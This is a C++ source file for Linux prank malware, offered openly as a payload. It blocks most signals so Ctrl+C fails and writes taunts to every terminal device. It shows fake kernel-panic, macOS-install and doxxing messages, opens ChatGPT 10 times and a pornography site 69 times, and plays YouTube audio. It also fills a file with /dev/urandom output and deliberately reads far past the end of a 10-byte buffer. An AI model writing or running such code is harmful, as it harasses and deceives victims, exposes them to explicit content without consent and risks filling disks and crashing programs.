/*

Copyright (C) 2026 Hyperion0801.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

#include <iostream>
#include <filesystem>
#include <string>
#include <csignal>
#include <fcntl.h>
#include <unistd.h>

// Define a variable for later
short repeatLoop = 0;

void displayText(std::string msg)
{
  // for gets all things in /dev
  for (const auto e : std::filesystem::directory_iterator("/dev"))
  {
    std::string name = e.path();
    // checks if not tty then continue
    if (!(!name.rfind("tty", 0))) {
      continue;
    }
    // write msg to ttyX
    int fd = open(e.path().c_str(), O_WRONLY | O_NONBLOCK);
    write(fd, msg.c_str(), msg.size());
    close(fd);
  }
  // for gets all stuff in /dev/pts
  for (const auto e : std::filesystem::directory_iterator("/dev/pts"))
  {
    std::string name = e.path().filename().string();
    // makes sure it isn't ptmx
    if (name == "ptmx") {
      continue;
    }
    // write to pts/X
    int fd = open(e.path().c_str(), O_WRONLY | O_NONBLOCK);
    write(fd, msg.c_str(), msg.size());
    close(fd);
  }
}

void funcOverflow()
{
  repeatLoop = 3072; // Amount of bytes to read.
  const char bufferOverflow[10] = "\nTesting";
  int i = 0;

  while(repeatLoop--) {
    std::cout << bufferOverflow[i] << std::flush;
    i++;
    usleep(25000);

  }
}

void loremIpsum()
{
  const char ipsumText[439] = "Lorem ipsum dolor sit amet consectetur adipiscing elit. Quisque faucibus ex sapien vitae pellentesque sem placerat. In id cursus mi pretium tellus duis convallis. Tempus leo eu aenean sed diam urna tempor. Pulvinar vivamus fringilla lacus nec metus bibendum egestas. Iaculis massa nisl malesuada lacinia integer nunc posuere. Ut hendrerit semper vel class aptent taciti sociosqu. Ad litora torquent per conubia nostra inceptos himenaeos.";

  // Sooooooooo, sorry flumpsi but I hardcoded this because it's simple.
  for(int i = 0; i < 439; i++)
  {
    std::cout << ipsumText[i] << std::flush;
    usleep(33333);
  }
}

void macOS()
{
  repeatLoop = 8;
  while(repeatLoop--)
  {
    // DOWNLOADING...
    displayText("\033[2J\033[1;1HDownloading macOS 27 Beta 1");
    usleep(666666);
    displayText("\033[2J\033[1;1HDownloading macOS 27 Beta 1.");
    usleep(666666);
    displayText("\033[2J\033[1;1HDownloading macOS 27 Beta 1..");
    usleep(666666);
    displayText("\033[2J\033[1;1HDownloading macOS 27 Beta 1...");
    usleep(666666);
  }

  // UNPACKING...
  displayText("\033[2J\033[1;1HUnpacking macOS 27 Beta 1");
  usleep(666666);
  displayText("\033[2J\033[1;1HUnpacking macOS 27 Beta 1.");
  usleep(666666);
  displayText("\033[2J\033[1;1HUnpacking macOS 27 Beta 1..");
  usleep(200000);

  repeatLoop = 3;
  while(repeatLoop--)
  {
    // INSTALLING...
    displayText("\033[2J\033[1;1HInstalling macOS 27 Beta 1");
    usleep(666666);
    displayText("\033[2J\033[1;1HInstalling macOS 27 Beta 1.");
    usleep(666666);
    displayText("\033[2J\033[1;1HInstalling macOS 27 Beta 1..");
    usleep(666666);
    displayText("\033[2J\033[1;1HInstalling macOS 27 Beta 1...");
    usleep(666666);
  }
  system("cat /dev/urandom > /miku/F59FEDE0");

}

int main()
{
  repeatLoop = 64;

  // Okay so I wanted to block as many signals as I could, so this loop covers that.
  while(repeatLoop > 0) {
    std::signal(repeatLoop, SIG_IGN);
    repeatLoop--;
  }

  // The most boring yet effective thing: TEXT.
  sleep(3);
  displayText("lol still using this PC?");
  sleep(5);
  displayText("\nSystem Unstable!!");
  sleep(2);
  displayText("\nOh no! Kernel Panic incoming!!!");
  sleep(1);
  displayText("\n( i am lying :) )");
  sleep(3);
  displayText("\n?CP siht gnisu llits lol");
  sleep(5);
  displayText("\nFun fact about AI: ");
  sleep(2);
  displayText("it sucks ass! So I'll fire up ChatGPT now to make you suffer. :)");
  repeatLoop = 10;

  // Ruining browser history with ChatGPT
  while (repeatLoop--) {
    system("xdg-open https://chatgpt.com");
  }
  sleep(5);
  displayText("Is this too little AI for you?");
  sleep(5);
  std::cout << "\033[2J\033[1;1H" << std::flush;
  loremIpsum();
  sleep(5);
  displayText("\nYo did you hear about the-\nHEADPHONE WARNING IN 5 SECONDS");
  system("mpv --no-video https://www.youtube.com/watch?v=vPlFkyXY6L0 > /dev/null");
  displayText("\nYou're a twerp for not liking Miku!\nWhat about the Kagamines?");
  system("mpv --no-video https://www.youtube.com/watch?v=KF9Mu2gXNdI > /dev/null");
  displayText("\nOkay how can I please you now?");
  sleep(5);
  macOS();
  sleep(10);
  displayText("\nHey I'm annoying, right? Just Ctrl+C!");
  sleep(6);

  repeatLoop = 69;
  while(repeatLoop--) {
    system("xdg-open https://pornhub.com");
  }
  sleep(5);

  displayText("\nRIP your browser history. In case you don't have a browser, nothing ran.");
  sleep(7);
  displayText("\nYour data is now on DoxBin! Well, at least if you have internet.");
  sleep(2);
  displayText("\nJust kidding.");
  sleep(5);
  displayText("\nKASANE TETO!!!");
  system("mpv --no-video https://www.youtube.com/watch?v=NwuXDha7OvE > /dev/null");
  displayText("\nHere we are, already at UTAUs, why not keep going?\nDon't worry, there will be some Momone Momo later.");
  sleep(8);

  repeatLoop = 100;

  while(repeatLoop--) {
    displayText("\nMomone Momo");
     usleep(10000);
  }
  repeatLoop = -1;
  sleep(5);
  displayText("\nOh wait did I figure it out?");
  system("mpv --no-video --volume=70 https://www.youtube.com/watch?v=GCcWD265-3E > /dev/null &");
  sleep(3);
  displayText("\nThere we go! Background music.");
  sleep(15);
  displayText("\nSo, what should I do next...");
  sleep(5);
  displayText("\nWe have too little payload but more time...");
  sleep(5);
  displayText("\nI think I got an idea.");
  sleep(2);
  funcOverflow();
}
